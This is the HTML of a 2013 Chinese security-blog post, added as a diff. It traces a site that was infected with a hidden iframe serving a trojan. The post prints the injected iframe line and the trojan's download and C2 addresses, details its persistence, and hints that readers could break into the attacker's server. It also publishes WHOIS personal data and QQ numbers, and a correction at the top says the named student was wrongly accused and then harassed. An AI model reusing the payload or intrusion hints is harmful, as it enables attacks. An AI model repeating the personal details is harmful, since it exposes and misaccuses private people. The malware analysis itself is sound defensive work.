@@ -1,0 +1,1632 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！ - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！今天（实际上是昨天写的文章）碰到了一巨“奇葩”的&#34;挂马&#34;&#34;黑客&#34;！！！且容我细细道来……本文所涉及到的数据包、木马样本均提供下载，请看末尾打包地址。今日早些时候，某朋友得到了一个“有问题”的网站（具体来源就不讲了，这个不重要，该站现已修复），发来看了看，于是发现了一巨奇葩挂马黑客，然后？然后当然是被核总逆向爆菊了……" />
+<meta name="keywords" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3772/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！" />
+<meta property="og:description" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！今天（实际上是昨天写的文章）碰到了一巨“奇葩”的&#34;挂马&#34;&#34;黑客&#34;！！！且容我细细道来……本文所涉及到的数据包、木马样本均提供下载，请看末尾打包地址。今日早些时候，某朋友得到了一个“有问题”的网站（具体来源就不讲了，这个不重要，该站现已修复），发来看了看，于是发现了一巨奇葩挂马黑客，然后？然后当然是被核总逆向爆菊了……" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3772/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-07-28T20:01:36&#43;08:00" />
+<meta property="article:modified_time" content="2013-08-04T08:27:12&#43;08:00" />
+
+<meta itemprop="name" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！">
+<meta itemprop="description" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！今天（实际上是昨天写的文章）碰到了一巨“奇葩”的&#34;挂马&#34;&#34;黑客&#34;！！！且容我细细道来……本文所涉及到的数据包、木马样本均提供下载，请看末尾打包地址。今日早些时候，某朋友得到了一个“有问题”的网站（具体来源就不讲了，这个不重要，该站现已修复），发来看了看，于是发现了一巨奇葩挂马黑客，然后？然后当然是被核总逆向爆菊了……"><meta itemprop="datePublished" content="2013-07-28T20:01:36&#43;08:00" />
+<meta itemprop="dateModified" content="2013-08-04T08:27:12&#43;08:00" />
+<meta itemprop="wordCount" content="8531">
+<meta itemprop="keywords" content="爆,爆菊,黑客,菊,逆向,追踪,app,CSS,DNS,exe,Html,HTTP,IE,IP,Net,QQ,Rat,Windows,百度,病毒,程序,电脑,分析,服务,服务器,工具,管理,管理系统,号码,技术,监控,检测,论坛,免杀,木马,视频,数据,腾讯,图片,网络,网站,微博,文件,系统,泄露,姓名,源码,远控,账号,中国," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！"/>
+<meta name="twitter:description" content="逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！今天（实际上是昨天写的文章）碰到了一巨“奇葩”的&#34;挂马&#34;&#34;黑客&#34;！！！且容我细细道来……本文所涉及到的数据包、木马样本均提供下载，请看末尾打包地址。今日早些时候，某朋友得到了一个“有问题”的网站（具体来源就不讲了，这个不重要，该站现已修复），发来看了看，于是发现了一巨奇葩挂马黑客，然后？然后当然是被核总逆向爆菊了……"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">逆向爆菊、反向追踪之：追查史上最奇葩的“挂马”黑客！</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-07-28" class="post-time">
+          2013-07-28
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E7%88%86/"> 爆 </a>
+            <a href="https://lcx.cc/categories/%E7%88%86%E8%8F%8A/"> 爆菊 </a>
+            <a href="https://lcx.cc/categories/%E9%BB%91%E5%AE%A2/"> 黑客 </a>
+            <a href="https://lcx.cc/categories/%E8%8F%8A/"> 菊 </a>
+            <a href="https://lcx.cc/categories/%E9%80%86%E5%90%91/"> 逆向 </a>
+            <a href="https://lcx.cc/categories/%E8%BF%BD%E8%B8%AA/"> 追踪 </a>
+            
+          </div>
+        <span class="more-meta"> 约 8531 字 </span>
+          <span class="more-meta"> 预计阅读 18 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p>
+	<strong><span style="color:#E53333;">2013-8-1 20:47:29 补充声明：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">事后经过与张少宇同学本人核实，该事件与张少宇（QQ：448322544）无关，而是之前他在网上认识的朋友“蛋蛋”（QQ：303900900，也就是92pojie域名注册人）一手操作。</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">92pojie网站成立的时候，张少宇同学有过参与，但与本次挂马事件无关，与挂马有联系纯属巧合。</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">张少宇同学五月份刚从美国回来，三月份的时候由于他不在国内，QQ也就交给网上的一个朋友也是他老乡代挂了。</span> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">请各位朋友终止对张少宇同学的骚扰，对此给各位带来的不便，本人深感抱歉。</span> 
+</p>
+<hr />
+<p>
+	<strong><span style="color:#E53333;">免责声明：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;">以下所有资料均是从木马病毒文件中提取出来的原始样本信息，或者是从公共查询系统、公共搜索引擎获取的<strong>公开资料</strong>！<strong>不涉及</strong>任何<strong>私人绝密资料</strong>或<strong>个人隐私信息</strong>！并且不是通过渗透、入侵等<strong>任何非法途径</strong>取得，所以本文内容<strong>完全合法</strong>，谢绝任何所谓的法律责任！</span> 
+</p>
+<hr />
+<p style="text-indent:2em;">
+	今天（实际上是昨天写的文章）碰到了一巨“奇葩”的"挂马""黑客"！！！且容<a href="https://lcx.cc/" target="_blank">我</a>细细道来……
+</p>
+<p style="text-indent:2em;">
+	本文所涉及到的数据包、木马样本均提供下载，请看末尾打包地址。
+</p>
+<hr />
+<p style="text-indent:2em;">
+	今日早些时候，某朋友得到了一个“有问题”的网站（具体来源就不讲了，这个不重要，该站现已修复），发来看了看，于是发现了一<span style="font-size:24px;">巨奇葩</span>挂马黑客，然后？然后当然是被<a href="https://lcx.cc/" target="_blank">核总</a>逆向爆菊了……
+</p>
+<p style="text-indent:2em;">
+	该问题网址为：
+</p>
+<pre class="prettyprint">路面施工质量管理系统-质量监督登录
+http://manage.v-app.cn/</pre>
+<p style="text-indent:2em;">
+	打开后跳转到：
+</p>
+<pre class="prettyprint">http://manage.v-app.cn/index.php?uc=session&amp;ua=login</pre>
+<p style="text-indent:2em;">
+	很明显是某种后台管理系统，然后突然弹出来一个文件下载框：
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2790_1.png" target="_blank"><img title="弹出来一个文件下载框" alt="弹出来一个文件下载框" src="/file/old/2790_1.png" width="780" height="417" /></a> 
+</p>
+<p style="text-indent:2em;">
+	纳尼？？？What The Fuck！这尼玛啥玩意儿？？
+</p>
+<p style="text-indent:2em;">
+	看这风骚的网址、淫荡的文件名，它应该是个木马没跑了！<a href="https://lcx.cc/" target="_blank">核总</a>大爱啊！操刀上！
+</p>
+<p style="text-indent:2em;">
+	首先翻看页面源代码：
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2791_2.png" target="_blank"><img title="页面源代码" alt="页面源代码" src="/file/old/2791_2.png" width="780" height="527" /></a> 
+</p>
+<p style="text-indent:2em;">
+	瞪大眼睛仔细一瞧，纳尼？？？！！！！！
+</p>
+<pre class="prettyprint lang-html">&lt;iframe src= http://108.171.246.30:8082/server.exe width=0 height=0&gt;&lt;/iframe&gt;                                                                                                                                                                                                                             &lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
+&lt;title&gt;路面施工质量管理系统-质量监督登录&lt;/title&gt;
+&lt;link href="/themes/css/login.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;</pre>
+<p style="text-indent:2em;">
+	<img title="What The Fuck！！！ Are you kidding me?" alt="What The Fuck！！！ Are you kidding me?" src="/file/old/2801_face.jpg" width="341" height="208" /> 
+</p>
+<p style="text-indent:2em;">
+	<strong><span style="color:#E53333;">What </span></strong><strong><span style="font-size:18px;">The</span> </strong><strong><span style="color:#E53333;font-size:24px;"><strong>Fuck</strong></span><span style="font-size:32px;"><strong>！！！</strong></span></strong> <strong>Are you <span style="color:#E53333;font-size:24px;">kidding</span> me<span style="color:#E53333;font-size:24px;">?</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	（<a href="https://lcx.cc/" target="_blank">核总</a>提示：<strong>这种代码格式一看就是使用<span style="color:#E53333;">通用挂马工具或脚本批量插入</span>的，完全<span style="color:#E53333;">破坏了源文件</span>，想不被人发现都难</strong>）
+</p>
+<p style="text-indent:2em;">
+	这他妈的谁挂的马？！逗我玩呢？？！！！！特么的太不专业了！！！！这是哪个抓鸡盗号论坛的版主教的你？？？！！！奇葩啊！！！！
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/" target="_blank">核总</a>当时就凌乱了！！！！哥玩电脑这么多年，还从来没见过如此奇葩的挂马方式！小朋友，你这有上线的么？……
+</p>
+<p style="text-indent:2em;">
+	咳！咳！扯远了，先把木马样本（见末尾样本打包）下下来再说……
+</p>
+<pre class="prettyprint">http://108.171.246.30:8082/server.exe
+IP地址: 108.171.246.30
+来自: 美国</pre>
+<p style="text-indent:2em;">
+	顺道检测了下服务器，直接访问根目录：
+</p>
+<p style="text-indent:2em;">
+	<img title="HttpFileServer v2.3 beta 266 随波汉化版" alt="HttpFileServer v2.3 beta 266 随波汉化版" src="/file/old/2792_3.png" width="732" height="620" /> 
+</p>
+<p style="text-indent:2em;">
+	HttpFileServer v2.3 beta 266 随波汉化版
+</p>
+<p style="text-indent:2em;">
+	纳尼？这特么的是个啥？百度了一下还蛮多的，目测是某种轻量级Web文件管理程序，感兴趣的可以检测下，兴许可以拿到服务器，由于本文不涉及任何非法入侵行为，所以这里就不演示了……
+</p>
+<p style="text-indent:2em;">
+	再看一下文件列表：
+</p>
+<pre class="prettyprint">http://108.171.246.30:8082/ 下的文件列表：
+
+文件修改时间			文件大小		点击量		位置
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+2013-7-24 3:52:07		276.61 K 		201		/server.exe
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+此目录下共有：
+1 个文件
+0 个文件夹
+所含文件总大小：276.61 K
+
+此文件列表由HFS v2.3 beta (Build #266)随波汉化版生成</pre>
+<p style="text-indent:2em;">
+	看木马最后修改时间，挺新的吗，这位抓鸡黑阔前两天凌晨四点才生成的……
+</p>
+<p style="text-indent:2em;">
+	根据经验（你懂的），又访问了一下80端口根目录：
+</p>
+<pre class="prettyprint">http://108.171.246.30/
+
+您未被授权查看该页
+
+HTTP 错误 401.1 - 未经授权：访问由于凭据无效被拒绝。</pre>
+<p style="text-indent:2em;">
+	很遗憾，看来没有开放访问……
+</p>
+<p style="text-indent:2em;">
+	把玩了一番木马文件托管服务器后，回过头来再看看下载下来的木马……
+</p>
+<p style="text-indent:2em;">
+	木马基本信息如下：
+</p>
+<pre class="prettyprint">server.exe
+
+276 KB (283,248 字节)
+
+最后修改时间：2013年7月24日，3:52:08
+
+Size: 283248
+MD5: 8b95b6782a0565c465b2a3f99c8b6b8d
+SHA1: ffeda72e3ee6b93660422152b90c248759a6da75
+SHA256: 62bfb4896dfa1e830bec9afb012e5ab370b067f06c561ff5026d03ccaf345aac
+
+Microsoft Visual C++ 6.0
+Notice:0x00000070 extra bytes found,starting at offset 0x00045200.
+PE32 executable for MS Windows (GUI) Intel 80386 32-bit</pre>
+<p style="text-indent:2em;">
+	先用纯文本模式打开看看（<a href="https://lcx.cc/" target="_blank"><span style="color:#E53333;">核总</span></a><span style="color:#E53333;">提示：在手头没有工具的情况下，这样可以快速判断文件性质，调用的API以及一些敏感字符串信息</span>），在木马样本末尾发现了搞笑的一幕……
+</p>
+<p style="text-indent:2em;">
+	<img title="木马样本尾部的黑阔电脑路径" alt="木马样本尾部的黑阔电脑路径" src="/file/old/2793_4.png" width="746" height="373" /> 
+</p>
+<p style="text-indent:2em;">
+	发现黑阔编译木马时泄露的电脑信息一条（核总提示：编译工具会泄露编译者电脑部分信息，曾被用来追踪木马程序作者，例如：<a href="https://lcx.cc/post/3213/" target="_blank">追踪PlugX Rat作者，人肉定向攻击远控PlugX开发者</a>）：
+</p>
+<pre class="prettyprint">C:\Documents and Settings\Administrator\桌面\过拦截3.77源码\3.77源码\NewLoader\Debug\Melody.pdb</pre>
+<p style="text-indent:2em;">
+	由此路径推断出放马黑阔电脑部分信息：
+</p>
+<p style="text-indent:2em;">
+	系统：Windows XP，账号：Administrator，某种开放源码的远控一款，程序版本号：3.77
+</p>
+<p style="text-indent:2em;">
+	然后又十六进制简单查看了下，发现一些木马配置信息：
+</p>
+<p style="text-indent:2em;">
+	<img title="十六进制查看 木马配置信息" alt="十六进制查看 木马配置信息" src="/file/old/2794_5.png" width="715" height="146" /> 
+</p>
+<p style="text-indent:2em;">
+	在文件尾部，以特定格式写入了几十字节数据：
+</p>
+<pre class="prettyprint">Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F
+
+00045200   4E 42 31 30 00 00 00 00  74 55 ED 51 02 00 00 00   NB10....tU鞶....
+00045210   43 3A 5C 44 6F 63 75 6D  65 6E 74 73 20 61 6E 64   C:\Documents and
+00045220   20 53 65 74 74 69 6E 67  73 5C 41 64 6D 69 6E 69    Settings\Admini
+00045230   73 74 72 61 74 6F 72 5C  D7 C0 C3 E6 5C B9 FD C0   strator\桌面\过?
+00045240   B9 BD D8 33 2E 37 37 D4  B4 C2 EB 5C 33 2E 37 37   菇?.77源码\3.77
+00045250   D4 B4 C2 EB 5C 4E 65 77  4C 6F 61 64 65 72 5C 44   源码\NewLoader\D
+00045260   65 62 75 67 5C 4D 65 6C  6F 64 79 2E 70 64 62 00   ebug\Melody.pdb.</pre>
+<p style="text-indent:2em;">
+	格式很简单，前四个字节是木马标志，然后四个零分割，家下来是五字节未知数据，应该是上线地址，末尾是刚才的黑阔电脑路径。
+</p>
+<p style="text-indent:2em;">
+	然后，<a href="https://lcx.cc/" target="_blank">核总</a>果断开了一台虚拟机，拆了这木马，揪出上线地址……
+</p>
+<p style="text-indent:2em;">
+	开启文件监控，然后打开抓包工具，最后执行木马，坐等其运行……
+</p>
+<p style="text-indent:2em;">
+	先看文件监控结果，木马创建了以下路径文件：
+</p>
+<p style="text-indent:2em;">
+	<img title="木马创建的文件" alt="木马创建的文件" src="/file/old/2795_6.png" width="669" height="438" /> 
+</p>
+<pre class="prettyprint">创建文件：
+
+c:\WINDOWS\D8C2E3B4 创建了
+c:\WINDOWS\D8C2E3B4\svchsot.exe 创建了
+c:\WINDOWS\Prefetch\NET1.EXE-029B9DB4.pf 创建了
+c:\WINDOWS\Prefetch\NET.EXE-01A53C2F.pf 创建了
+c:\WINDOWS\Tasks\At1.job 创建了
+c:\WINDOWS\Tasks\At2.job 创建了
+c:\WINDOWS\Tasks\At3.job 创建了
+c:\WINDOWS\Tasks\At4.job 创建了
+c:\WINDOWS\Tasks\At6.job 创建了
+c:\WINDOWS\Tasks\At7.job 创建了
+c:\WINDOWS\Tasks\At9.job 创建了
+c:\WINDOWS\Tasks\At11.job 创建了
+c:\WINDOWS\Tasks\At13.job 创建了
+c:\WINDOWS\Tasks\At15.job 创建了
+c:\WINDOWS\Tasks\At15.job 创建了
+c:\WINDOWS\Tasks\At18.job 创建了
+c:\WINDOWS\Tasks\At20.job 创建了
+c:\WINDOWS\Tasks\At22.job 创建了
+c:\WINDOWS\Tasks\At24.job 创建了
+……</pre>
+<p style="text-indent:2em;">
+	可以看到，该木马在Windows目录创建了一文件夹“D8C2E3B4”（<strong><span style="color:#E53333;">可能是随机命名的</span></strong>），然后复制自身到该目录，最后创建了一堆计划任务，目测是用来自启动的……
+</p>
+<p style="text-indent:2em;">
+	再看看木马建立的启动项：
+</p>
+<p style="text-indent:2em;">
+	<img title="木马建立的启动项" alt="木马建立的启动项" src="/file/old/2796_7.png" width="773" height="502" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="木马建立的启动项" alt="木马建立的启动项" src="/file/old/2797_8.png" width="731" height="373" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="木马建立的启动项" alt="木马建立的启动项" src="/file/old/2798_9.png" width="720" height="515" /> 
+</p>
+<p style="text-indent:2em;">
+	<img title="木马创建的计划任务" alt="木马创建的计划任务" src="/file/old/2799_10.png" width="576" height="596" /> 
+</p>
+<p style="text-indent:2em;">
+	可以很明显的看出来，该木马使用两种方式实现自启动：
+</p>
+<p style="text-indent:2em;">
+	1、使用注册表启动项自启动：
+</p>
+<pre class="prettyprint">Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+"D8C2E3B4"="C:\\WINDOWS\\D8C2E3B4\\svchsot.exe"</pre>
+<p style="text-indent:2em;">
+	2、使用Windows的计划任务功能实现自启动，该木马一共创建了24个计划任务，在未来一天中将会每隔一小时执行一次：
+</p>
+<pre class="prettyprint">C:\WINDOWS\Tasks\At1.job
+C:\WINDOWS\Tasks\At2.job
+C:\WINDOWS\Tasks\At3.job
+C:\WINDOWS\Tasks\At4.job
+C:\WINDOWS\Tasks\At5.job
+C:\WINDOWS\Tasks\At6.job
+C:\WINDOWS\Tasks\At7.job
+C:\WINDOWS\Tasks\At8.job
+C:\WINDOWS\Tasks\At9.job
+C:\WINDOWS\Tasks\At10.job
+C:\WINDOWS\Tasks\At11.job
+C:\WINDOWS\Tasks\At12.job
+C:\WINDOWS\Tasks\At13.job
+C:\WINDOWS\Tasks\At14.job
+C:\WINDOWS\Tasks\At15.job
+C:\WINDOWS\Tasks\At16.job
+C:\WINDOWS\Tasks\At17.job
+C:\WINDOWS\Tasks\At18.job
+C:\WINDOWS\Tasks\At19.job
+C:\WINDOWS\Tasks\At20.job
+C:\WINDOWS\Tasks\At21.job
+C:\WINDOWS\Tasks\At22.job
+C:\WINDOWS\Tasks\At23.job
+C:\WINDOWS\Tasks\At24.job</pre>
+<p style="text-indent:2em;">
+	另附上在线程序行为分析、病毒检测结果：
+</p>
+<p style="text-indent:2em;">
+	1、<a href="http://camas.comodo.com/cgi-bin/submit?file=62bfb4896dfa1e830bec9afb012e5ab370b067f06c561ff5026d03ccaf345aac" target="_blank">Comodo Instant Malware Analysis</a> 
+</p>
+<pre class="prettyprint">0xd8 C:\TEST\sample.exe 0x8a2900 CopyFileA(lpExistingFileName: "C:\TEST\sample.exe", lpNewFileName: "C:\WINDOWS\D8C2E3B4\svchsot.exe", bFailIfExists: 0x1)|0x1 
+
+DNS Queries
+DNS Query Text
+www.92pojie.net IN A +</pre>
+<p style="text-indent:2em;">
+	2、<a href="http://anubis.iseclab.org/?action=result&task_id=1139668e575f8f1448d1802353e8854bf" target="_blank">Anubis: Analyzing Unknown Binaries</a>，<a href="http://anubis.iseclab.org/?action=result&task_id=1139668e575f8f1448d1802353e8854bf&format=html" target="_blank">Html格式报告</a> 
+</p>
+<p style="text-indent:2em;">
+	3、VirSCAN.org <a href="http://r.virscan.org/report/1ea7d4c7aad1b9802d26c31ae1815d6d.html" target="_blank">11%的杀软(4/36)报告发现病毒</a>，免杀效果不错嘛，国内杀软几乎全过。
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/" target="_blank">核总</a>这里给出<strong><span style="color:#E53333;">该木马手工查杀方法</span></strong>：
+</p>
+<p style="text-indent:2em;">
+	1、先使用进程管理工具结束掉木马进程，该木马属普通木马，没有任何进程保护功能。
+</p>
+<p style="text-indent:2em;">
+	2、进入系统目录，清理掉上述木马创建的文件列表。
+</p>
+<p style="text-indent:2em;">
+	3、然后使用启动项管理工具（例如：XueTr、PowerTool），删除木马创建的启动项及计划任务（删除文件也可）。
+</p>
+<p style="text-indent:2em;">
+	很好，接下来分析<strong>木马通讯数据包</strong>（Packets.cscpkt，科来网络分析系统 2010 技术交流版，数据包提供下载，见末尾）：
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2800_11.png" target="_blank"><img title="木马通讯数据包" alt="木马通讯数据包" src="/file/old/2800_11.png" width="780" height="440" /></a> 
+</p>
+<p style="text-indent:2em;">
+	一眼就可以揪出木马上线地址：
+</p>
+<pre class="prettyprint">TCP: www.92pojie.net:2012 --&gt; 108.171.246.30:2012</pre>
+<p style="text-indent:2em;">
+	可以看出，该域名和之前托管木马的下载地址是同一服务器。
+</p>
+<p style="text-indent:2em;">
+	连接了一下该端口，发现可以连通，那么其远控主控端仍在服务器上运行，目测肉鸡不少，感兴趣的朋友可以日下服务器观摩观摩……
+</p>
+<p style="text-indent:2em;">
+	果断 Whois 查了一下：
+</p>
+<pre class="prettyprint">Whois 信息：
+
+域名：92pojie.net
+注册商：SHANGHAI YOVOLE NETWORKS INC.
+域名服务器：whois.yovole.com
+DNS服务器：NS.YOVOLE.COM
+DNS服务器：NS1.YOVOLE.COM
+域名状态：运营商设置了客户禁止转移保护
+更新时间：12-3月-2013
+创建时间：12-3月-2013
+过期时间：12-3月-2014
+
+domain: 92pojie.net
+mntnr: MNTNR1
+changed: 2013-03-22 04:54:04.0
+nameserver: ns.yovole.com
+nameserver: ns1.yovole.com
+
+[holder]
+mntnr: MNTNR1
+type: ORGANISATION
+name: zhou shuqiang
+address: Zheng Dong New District 107 State Road
+pcode: 450000
+country: CN
+phone: 86-052389150111
+fax: 86-052389150111
+email: 303900900@qq.com
+changed: 2013-07-28 15:46:48.0
+
+[admin_c]
+mntnr: MNTNR1
+type: ORGANISATION
+name: shuqiang zhou
+address: Zheng Dong New District 107 State Road
+pcode: 450000
+country: CN
+phone: 86-052389150111
+fax: 86-052389150111
+email: 303900900@qq.com
+changed: 2013-07-28 15:46:48.0
+
+[tech_c]
+mntnr: MNTNR1
+type: ORGANISATION
+name: shuqiang zhou
+address: Zheng Dong New District 107 State Road
+pcode: 450000
+country: CN
+phone: 86-052389150111
+fax: 86-052389150111
+email: 303900900@qq.com
+changed: 2013-07-28 15:46:48.0
+
+[zone_c]
+mntnr: MNTNR1
+type: ORGANISATION
+name: shuqiang zhou
+address: Zheng Dong New District 107 State Road
+pcode: 450000
+country: CN
+phone: 86-052389150111
+fax: 86-052389150111
+email: 303900900@qq.com
+changed: 2013-07-28 15:46:48.0</pre>
+<p style="text-indent:2em;">
+	然后从中得到以下有价值资料：
+</p>
+<pre class="prettyprint">92pojie.net 域名 DNS 服务器由“有孚网络—中国领先的云计算数据中心运营商（www.yovole.com）”托管。
+
+姓名：zhou shu qiang （周树强？）
+地址：Zheng Dong New District 107 State Road （郑东新区107国道）
+P 码：450000
+电话/传真：86-052389150111（这号码是3A网络（www.cnaaa.com）的客服电话，该域名是在这里注册的？）
+邮件：303900900@qq.com</pre>
+<p style="text-indent:2em;">
+	紧接着百度搜了一下：92pojie.net，然后看到：
+</p>
+<p style="text-indent:2em;">
+	<img title="百度搜了一下：92pojie.net" alt="百度搜了一下：92pojie.net" src="/file/old/2802_12.png" width="571" height="667" /> 
+</p>
+<pre class="prettyprint">张少宇的微博_腾讯微博
